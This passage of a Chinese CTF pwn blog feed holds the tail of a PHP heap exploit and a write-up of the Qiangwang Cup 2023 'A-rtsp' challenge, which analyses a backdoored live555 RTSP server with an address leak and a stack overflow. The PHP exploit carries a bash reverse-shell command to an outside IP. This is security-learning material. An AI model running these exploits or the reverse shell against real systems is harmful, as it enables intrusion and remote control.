class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc_base</span>, <span class="variable">$module_base</span>, <span class="variable">$libc</span>, <span class="variable">$mbase</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line">    <span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line">    <span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line">    <span class="variable">$libc_base</span>=<span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line">    <span class="variable">$module_base</span>=<span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc_base</span>, <span class="variable">$module_base</span>;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">str_pad</span>(<span class="title function_ invoke__">p64</span>(<span class="variable">$module_base</span> + <span class="number">0x4038</span>).<span class="title function_ invoke__">p64</span>(<span class="number">0xff</span>), <span class="number">0x40</span>, <span class="string">&quot;\x90&quot;</span>);</span><br><span class="line">    <span class="variable">$gadget</span> = <span class="title function_ invoke__">p64</span>(<span class="variable">$libc_base</span> + <span class="number">0x4c490</span>);</span><br><span class="line">    <span class="title function_ invoke__">addHacker</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\x90&quot;</span>, <span class="number">0x8</span>), <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\x90&quot;</span>, <span class="number">0x30</span>));</span><br><span class="line">    <span class="title function_ invoke__">addHacker</span>(<span class="variable">$payload</span>, <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\x90&quot;</span>, <span class="number">0x2f</span>));<span class="comment">//下下个chunk也就是,$payload所在chunk又是之前那个,所以现在覆盖了ptr</span></span><br><span class="line">    <span class="title function_ invoke__">addHacker</span>(<span class="title function_ invoke__">str_pad</span>(<span class="variable">$cmd</span>, <span class="number">0x20</span>, <span class="string">&quot;\x00&quot;</span>), <span class="string">&quot;114514&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">editHacker</span>(<span class="number">0</span>, <span class="variable">$gadget</span>);<span class="comment">//edit就是在任意写了</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/114.514.19.19/810 0&gt;&amp;1&quot;&#x27;</span>;<span class="comment">//= =</span></span><br><span class="line">    <span class="title function_ invoke__">leak</span>();</span><br><span class="line">    <span class="title function_ invoke__">attack</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="title function_ invoke__">removeHacker</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">main</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">php is good</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="phppwn" scheme="https://ixout.github.io/tags/phppwn/"/>
    
  </entry>
  
  <entry>
    <title>强网杯2023两道题</title>
    <link href="https://ixout.github.io/posts/36820/"/>
    <id>https://ixout.github.io/posts/36820/</id>
    <published>2024-04-23T13:48:22.000Z</published>
    <updated>2024-05-03T11:24:41.210Z</updated>
    
    <content type="html"><![CDATA[<h1 id="A-rtsp"><a href="#A-rtsp" class="headerlink" title="A-rtsp"></a>A-rtsp</h1><h2 id="rtsp"><a href="#rtsp" class="headerlink" title="rtsp"></a>rtsp</h2><p>通过搜索字符串rtsp可以知道采用的标准是rtsp1.0</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-23_221908.png" alt=""></p><p>对应的RFC是<a href="https://www.rfc-editor.org/rfc/rfc2326.html">RFC 2326: Real Time Streaming Protocol (RTSP) (rfc-editor.org)</a></p><p>同时参考<a href="https://zhuanlan.zhihu.com/p/478736595">最详细的音视频流媒体传输协议-rtsp协议详解 - 知乎 (zhihu.com)</a>这篇文章</p><p>rtsp协议是啥</p><blockquote><p>RTSP全称实时流协议（Real Time Streaming Protocol），它是一个网络控制协议，设计用于娱乐、会议系统中控制流媒体服务器。RTSP用于在希望通讯的两端建立并控制媒体会话（session），客户端通过发出VCR-style命令如play、record和pause等来实时控制媒体流。</p></blockquote><p>RTSP协议采用客户服务器(CS)方式工作</p><h3 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h3><p><strong>RTSP客户端的请求格式</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">method url vesion\r\n</span><br><span class="line">CSeq: x\r\n</span><br><span class="line">xxx\r\n</span><br><span class="line">...</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><ul><li>method：方法，表明这次请求的方法</li><li>url：<strong>格式一般为rtsp://ip:port/session</strong>，ip表主机ip，port表端口好，如果不写那么就是默认端口，rtsp的默认端口为554，session表明请求哪一个会话</li><li>version：表示rtsp的版本，现在为RTSP/1.0</li><li>CSeq：序列号，每个RTSP请求和响应都对应一个序列号，序列号是递增的</li></ul><p>一个实例</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-23_223449.png" alt=""></p><p>请求方法有OPTIONS、DESCRIBE、SETUP、TEARDOWN、PLAY、PAUSE、GET_PARAMETER和SET_PARAMETER。</p><p><strong>RTSP服务端的响应格式</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vesion 200 OK\r\n</span><br><span class="line">CSeq: x\r\n</span><br><span class="line">xxx\r\n</span><br><span class="line">...</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><ul><li>version：表示rtsp的版本，现在为RTSP/1.0</li><li>CSeq：序列号，这个必须与对应请求的序列号相同</li></ul><p>状态码</p><ul><li>1xx：信息-已收到请求，正在继续处理</li><li>2xx：成功-成功接收、理解和接受操作</li><li>3xx：重定向-必须执行进一步操作才能完成请求</li><li>4xx：客户端错误-请求包含错误语法或无法实现</li><li>5xx：服务器错误-服务器未能完成明显有效的请求</li></ul><hr><p>更多可以另行学习,对于本题这些知识就够了</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序ida打开,哦豁是c++写的,又需要万恶的c++逆向(不过总比rust和go要好)</p><p>万幸的是没有去除符号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 (__fastcall *v4)(__int64, __int64); <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v7; <span class="comment">// r8</span></span><br><span class="line">  ServerMediaSubsession *v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+14h] [rbp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [rsp+17h] [rbp-49h]</span></span><br><span class="line">  ServerMediaSession *v13; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  UsageEnvironment *v14; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  UsageEnvironment *v15; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> *v16; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  RTSPServer *v17; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  BasicUsageEnvironment *New; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  New = (BasicUsageEnvironment *)BasicTaskScheduler::createNew(</span><br><span class="line">                                   (BasicTaskScheduler *)&amp;stru_2708.r_info,</span><br><span class="line">                                   (<span class="type">unsigned</span> <span class="type">int</span>)argv);</span><br><span class="line">  env = (UsageEnvironment *)BasicUsageEnvironment::createNew(New, (TaskScheduler *)argv);</span><br><span class="line">  v18 = <span class="number">0LL</span>;</span><br><span class="line">  Port::Port((Port *)&amp;v11, <span class="number">0x216A</span>u);</span><br><span class="line">  v17 = (RTSPServer *)RTSPServer::createNew(env, (<span class="type">unsigned</span> __int16)v11, v18, <span class="number">65LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v17 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (*(__int64 (__fastcall **)(UsageEnvironment *, <span class="type">const</span> <span class="type">char</span> *))(*(_QWORD *)env + <span class="number">72LL</span>))(</span><br><span class="line">           env,</span><br><span class="line">           <span class="string">&quot;Failed to create RTSP server: &quot;</span>);</span><br><span class="line">    v4 = *(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v3 + <span class="number">72LL</span>);</span><br><span class="line">    v5 = (**(__int64 (__fastcall ***)(UsageEnvironment *))env)(env);</span><br><span class="line">    v6 = v4(v3, v5);</span><br><span class="line">    (*(<span class="type">void</span> (__fastcall **)(__int64, <span class="type">const</span> <span class="type">char</span> *))(*(_QWORD *)v6 + <span class="number">72LL</span>))(v6, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = <span class="string">&quot;Session streamed by \&quot;testOnDemandRTSPServer\&quot;&quot;</span>;</span><br><span class="line">  v15 = (UsageEnvironment *)<span class="string">&quot;wavAudioTest&quot;</span>;</span><br><span class="line">  v14 = (UsageEnvironment *)<span class="string">&quot;test.wav&quot;</span>;</span><br><span class="line">  v13 = (ServerMediaSession *)ServerMediaSession::createNew(</span><br><span class="line">                                env,</span><br><span class="line">                                (UsageEnvironment *)<span class="string">&quot;wavAudioTest&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;wavAudioTest&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;Session streamed by \&quot;testOnDemandRTSPServer\&quot;&quot;</span>,</span><br><span class="line">                                <span class="number">0LL</span>,</span><br><span class="line">                                <span class="number">0</span>,</span><br><span class="line">                                (<span class="type">const</span> <span class="type">char</span> *)argv);</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v8 = (ServerMediaSubsession *)WAVAudioFileServerMediaSubsession::createNew(</span><br><span class="line">                                  env,</span><br><span class="line">                                  v14,</span><br><span class="line">                                  (<span class="type">const</span> <span class="type">char</span> *)(<span class="type">unsigned</span> __int8)reuseFirstSource,</span><br><span class="line">                                  <span class="number">0</span>,</span><br><span class="line">                                  v7);</span><br><span class="line">  ServerMediaSession::addSubsession(v13, v8);</span><br><span class="line">  (*(<span class="type">void</span> (__fastcall **)(RTSPServer *, ServerMediaSession *))(*(_QWORD *)v17 + <span class="number">72LL</span>))(v17, v13);</span><br><span class="line">  announceStream(v17, v13, (<span class="type">const</span> <span class="type">char</span> *)v15, (<span class="type">const</span> <span class="type">char</span> *)v14);</span><br><span class="line">  v9 = UsageEnvironment::taskScheduler(env);</span><br><span class="line">  (*(<span class="type">void</span> (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v9 + <span class="number">56LL</span>))(v9, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到有很多没见过的类,搜索一下<code>BasicTaskScheduler</code>,找到关键词<code>live555</code></p><p>继续搜索<code>live555</code>,<a href="https://zhuanlan.zhihu.com/p/678497370">基于Live555框架实现一个实时流媒体服务 - 知乎 (zhihu.com)</a>,可以知道live555是rtsp协议的一种实现</p><p>现在我们有两种办法向下继续分析</p><ol><li><p>既然找到了live555开源项目,那么这类题一般都是在原有代码的基础上做一些修改,所以我们可以自己编译一个live555,然后通过bindiff来找到这些函数</p></li><li><p>第二种方法是比较看观察能力的,而且并不具备普适性,通过找到后门提示中的字符串来定位关键漏洞函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rodata:000000000007B39B0000001CC100 maybe you need this %p\n</span><br><span class="line">.rodata:000000000007B3C800000022C100 you may want to get more flag</span><br><span class="line">.rodata:000000000007B40B0000000CCvul_string:</span><br></pre></td></tr></table></figure></li></ol><p>总之关键就是在于定位到漏洞函数</p><p>在GET_PARAMETER中存在泄露</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall RTSPServer::RTSPClientConnection::handleCmd_GET_PARAMETER(</span><br><span class="line">        RTSPServer::RTSPClientConnection *this,</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *a2,</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">215</span>]; <span class="comment">// [rsp+40h] [rbp-E0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+117h] [rbp-9h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+11Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  s1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="type">int</span>)(a3 - <span class="number">9</span>) &gt; (<span class="type">int</span>)i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !strncasecmp(<span class="string">&quot;GET_INFO:&quot;</span>, &amp;a2[i], <span class="number">9uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i += <span class="number">9</span>; i &lt; a3 &amp;&amp; (a2[i] == <span class="string">&#x27; &#x27;</span> || a2[i] == <span class="number">9</span>); ++i )</span><br><span class="line">        ;</span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( v8 &lt;= <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = a2[i];</span><br><span class="line">        s1[v8++] = v7;</span><br><span class="line">        ++i;</span><br><span class="line">      &#125;</span><br><span class="line">      s1[v8] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;2023&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> RTSPServer::RTSPClientConnection::setRTSPResponse(this, <span class="string">&quot;100 you may want to get more flag&quot;</span>, <span class="string">&quot;2023.03.30&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;100 maybe you need this %p\n&quot;</span>, &amp;gift);</span><br><span class="line">  <span class="keyword">return</span> RTSPServer::RTSPClientConnection::setRTSPResponse(this, s, <span class="string">&quot;2023.03.30&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要传输一个标签<code>GET_INFO</code>,值为<code>2023</code></p><p>在DESCRIBE中存在栈溢出漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> __fastcall RTSPServer::RTSPClientConnection::handleCmd_DESCRIBE(</span><br><span class="line">        RTSPServer::RTSPClientConnection *this,</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *a2,</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *a3,</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *a4)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> result; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">406</span>]; <span class="comment">// [rsp+20h] [rbp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+1B6h] [rbp-Ah]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+1B7h] [rbp-9h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+1B8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1BCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  dest[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcat</span>(dest, a2);</span><br><span class="line">    *(_WORD *)&amp;dest[<span class="built_in">strlen</span>(dest)] = <span class="number">47</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcat</span>(dest, a3);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)this + <span class="number">10084</span>) == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="built_in">strlen</span>(a4) - <span class="number">11</span>;</span><br><span class="line">      result = i;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt;= i )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !strncasecmp(<span class="string">&quot;vul_string:&quot;</span>, &amp;a4[i], <span class="number">0xB</span>uLL) )</span><br><span class="line">      &#123;</span><br><span class="line">        i += <span class="number">11</span>;</span><br><span class="line">        v11 = <span class="built_in">strlen</span>(dest) - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = a4[i];</span><br><span class="line">          v9 = a4[i + <span class="number">1</span>];</span><br><span class="line">          <span class="keyword">if</span> ( v10 == <span class="number">13</span> &amp;&amp; v9 == <span class="number">10</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          dest[v11++] = v10;</span><br><span class="line">          ++i;</span><br><span class="line">        &#125;</span><br><span class="line">        result = v11;</span><br><span class="line">        dest[v11] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> __int8)RTSPServer::RTSPClientConnection::authenticationOK(this, <span class="string">&quot;DESCRIBE&quot;</span>, dest, a4) == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">return</span> (*(__int64 (__fastcall **)(_QWORD, <span class="type">char</span> *, __int64 (__fastcall *)(RTSPServer::RTSPClientConnection *__hidden, <span class="type">void</span> *, ServerMediaSession *), RTSPServer::RTSPClientConnection *, __int64))(**((_QWORD **)this + <span class="number">1</span>) + <span class="number">80LL</span>))(</span><br><span class="line">               *((_QWORD *)this + <span class="number">1</span>),</span><br><span class="line">               dest,</span><br><span class="line">               RTSPServer::RTSPClientConnection::DESCRIBELookupCompletionFunction,</span><br><span class="line">               this,</span><br><span class="line">               <span class="number">1LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但需要满足一个条件,即<code>if ( *((_DWORD *)this + 10084) == 3 )</code></p><p>这个可以在SET_PARAMETER中实现,传输一个标签<code>DESCRIBE_FLAG</code>,值为<code>flag</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall RTSPServer::RTSPClientConnection::handleCmd_SET_PARAMETER(</span><br><span class="line">        RTSPServer::RTSPClientConnection *this,</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *a2,</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1[<span class="number">215</span>]; <span class="comment">// [rsp+20h] [rbp-E0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+F7h] [rbp-9h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+F8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+FCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  s1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="type">int</span>)(a3 - <span class="number">14</span>) &gt; (<span class="type">int</span>)i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !strncasecmp(<span class="string">&quot;DESCRIBE_FLAG:&quot;</span>, &amp;a2[i], <span class="number">0xE</span>uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i += <span class="number">14</span>; i &lt; a3 &amp;&amp; (a2[i] == <span class="number">32</span> || a2[i] == <span class="number">9</span>); ++i )</span><br><span class="line">        ;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; a3 )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = a2[i];</span><br><span class="line">        <span class="keyword">if</span> ( v6 == <span class="number">13</span> || v6 == <span class="number">10</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        s1[v7++] = v6;</span><br><span class="line">        ++i;</span><br><span class="line">      &#125;</span><br><span class="line">      s1[v7] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;qwb&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> RTSPServer::RTSPClientConnection::setRTSPResponse(this, <span class="string">&quot;200 OK&quot;</span>);</span><br><span class="line">  *((_DWORD *)this + <span class="number">10084</span>) = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">return</span> RTSPServer::RTSPClientConnection::setRTSPResponse(this, <span class="string">&quot;202 OK&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后就是栈溢出orw</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span 